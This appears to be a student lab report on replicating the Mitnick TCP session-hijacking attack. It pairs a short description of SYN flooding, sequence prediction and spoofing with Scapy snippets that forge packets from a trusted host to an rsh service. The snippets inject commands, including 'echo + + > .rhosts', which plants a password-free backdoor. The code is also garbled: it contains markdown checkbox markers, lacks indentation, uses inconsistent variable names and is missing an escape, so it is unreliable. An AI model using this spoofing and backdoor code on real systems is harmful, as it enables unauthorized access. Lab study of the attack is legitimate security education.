# Case-study-replicating-the-Mitnick-Attack-a-TCP-session-hijacking-technique

In this report, we are executing a multi-step attack that exploits trust relationships in networked systems. First, would be to initiate a SYN flooding attack to make the trusted server unresponsive, preventing it from resetting a spoofed TCP connection. While the server is withheld, TCP sequence number prediction is performed, analysing patterns in sequence numbers to craft valid packets that appear authentic. With this information, session hijacking and spoofing is executed by forging a connection between the trusted server and the target system. Once access is gained, an rsh command is injected into the hijacked session, modifying the .rhosts file to create a conveniently accessible backdoor. This allows us to maintain unauthorized access in the future without requiring authentication, effectively compromising the system’s security.

Vulnerabilities Exploited
The attack exploits weaknesses in the TCP/IP protocol, particularly the predictability of TCP sequence numbers and the trust relationships between systems.
Experiments

The attack consisted of several key steps:
● SYN Flooding to Silence the Trusted Server
● TCP Sequence Number Prediction
● Session Hijacking & Spoofing
● Backdoor Implantation 

Key Components of the Attack Scenario 
● Target System: X-Terminal (the system that we want to access)
● Trusted Server: A system with pre-established, password-free access to X-Terminal 

Network Topology 
[Attacker] --- (Spoofed Traffic) ---> [Target System (X-Terminal)] | |--> [Trusted Server (Silenced)]

Spoofing the Trusted Host:
 
    from scapy.all import *
    - [ ] jeythaip = IP(src="10.9.0.5", dst="10.9.0.6")
    venktop = TCP(sport=1023, dport=514, flags="S", seq=778933536)
    - [x] pkt = jeythaip/venktop
    ls(pkt)
    send(pkt, verbose=0)

Predicting TCP Sequence Numbers:

    from scapy.all import *
    jeythaip = IP(src="10.9.0.5", dst="10.9.0.6")
    venktcp = TCP(sport=1023, dport=514, flags="A", seq= 778933537, ack=399324157)
    if venktcp.flags == "A":
    print("Establishing ACK packet")
    data = '9090\x00seed\x00dees\x00touch /tmp/xyz\x00'
    pkt = jeythaip/venktcp/data
    ls(pkt)
    send(pkt, verbose=0)

Setting Up the Backdoor:

    from scapy.all import *
    jeythaip = IP(src="10.9.0.5", dst="10.9.0.6")
    venktop = TCP(sport=1023, dport=514, flags="A", seq= 778933537, ack=399324157)
    if venktop.flags == "A":
    print("Establishing ACK packet")
    data = '9090\x00seed\x00dees\x00echo + + > .rhostsx00'
    pkt = jeythaip/venktop/data
    ls(pkt)
    send(pkt, verbose=0)
